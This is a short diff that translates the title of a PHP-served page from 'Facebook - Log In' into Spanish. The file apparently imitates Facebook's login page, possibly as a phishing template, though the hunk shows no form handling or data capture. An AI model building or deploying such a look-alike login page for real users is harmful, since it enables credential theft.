@@ -5,7 +5,7 @@ require_once('helper.php');
 
 <html>
   <head>
-    <title>Facebook - Log In</title>
+    <title>Iniciar sesión en Facebook</title>
     <meta charset='UTF-8'>
     <meta http-equiv="cache-control" content="no-cache" />
     <meta http-equiv="expires" content="0" />
